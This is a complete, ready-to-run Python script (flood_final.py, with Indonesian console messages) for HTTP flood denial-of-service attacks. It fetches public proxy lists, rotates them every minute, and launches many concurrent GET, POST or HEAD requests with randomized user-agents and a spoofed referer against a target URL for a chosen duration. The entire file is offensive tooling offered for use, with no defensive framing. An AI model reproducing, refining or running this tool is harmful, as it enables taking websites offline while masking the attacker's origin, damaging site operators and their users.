import sys
import random
import asyncio
import aiohttp
import requests
import time

PROXY_API = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
]

METHODS = ["GET", "POST", "HEAD"]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.google.com",
        "Connection": "keep-alive",
    }

def fetch_proxies():
    try:
        r = requests.get(PROXY_API, timeout=10)
        proxies = ["http://" + l.strip() for l in r.text.splitlines() if ":" in l]
        return proxies
    except Exception as e:
        print(f"[Proxy] Gagal ambil proxy: {e}")
        return []

async def update_proxy_list(proxy_list, interval=60):
    while True:
        proxies = await asyncio.get_event_loop().run_in_executor(None, fetch_proxies)
        if proxies:
            proxy_list.clear()
            proxy_list.extend(proxies)
            print(f"[Proxy] Diperbarui: {len(proxies)} proxy aktif.")
        else:
            print("[Proxy] Gagal ambil proxy terbaru.")
        await asyncio.sleep(interval)

async def flood(session, target, proxy_list, duration, stats, tid, method=None):
    end = time.time() + duration
    while time.time() < end:
        if not proxy_list:
            await asyncio.sleep(1)
            continue
        proxy = random.choice(proxy_list)
        req_method = method if method in METHODS else random.choice(METHODS)
        headers = get_headers()
        try:
            if req_method == "GET":
                async with session.get(target, proxy=proxy, headers=headers, timeout=7) as resp:
                    code = resp.status
            elif req_method == "POST":
                async with session.post(target, proxy=proxy, headers=headers, data={"rand": random.randint(1, 10000)}, timeout=7) as resp:
                    code = resp.status
            else:  # HEAD
                async with session.head(target, proxy=proxy, headers=headers, timeout=7) as resp:
                    code = resp.status
            if code in [200, 301, 302, 403, 404]:
                stats["succ"] += 1
            else:
                stats["fail"] += 1
        except Exception:
            stats["fail"] += 1
        await asyncio.sleep(0.05)

async def main():
    if len(sys.argv) < 4:
        print("Usage: python3 flood_final.py <target_url> <duration_sec> <tasks> [method]")
        print("method: GET, POST, HEAD (optional, default random)")
        return

    target = sys.argv[1]
    duration = int(sys.argv[2])
    tasks_count = int(sys.argv[3])
    method = sys.argv[4].upper() if len(sys.argv) >= 5 else None
    if method and method not in METHODS:
        print(f"[!] Metode {method} tidak valid. Pilih dari: {METHODS}")
        return

    proxy_list = fetch_proxies()
    if not proxy_list:
        print("[!] Gagal ambil proxy. Keluar.")
        return

    print(f"[*] Target: {target}")
    print(f"[*] Durasi: {duration}s")
    print(f"[*] Tasks: {tasks_count}")
    print(f"[*] Proxy awal: {len(proxy_list)}")
    print(f"[*] Method: {method if method else 'Random'}")

    stats = {"succ": 0, "fail": 0}

    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, target, proxy_list, duration, stats, i, method) for i in range(tasks_count)]
        tasks.append(update_proxy_list(proxy_list))
        await asyncio.gather(*tasks)

    print("\n📊 Statistik akhir:")
    print(f"✅ Sukses: {stats['succ']}")
    print(f"❌ Gagal : {stats['fail']}")
    print(f"🕒 Durasi: {duration}s")

if __name__ == "__main__":
    asyncio.run(main())
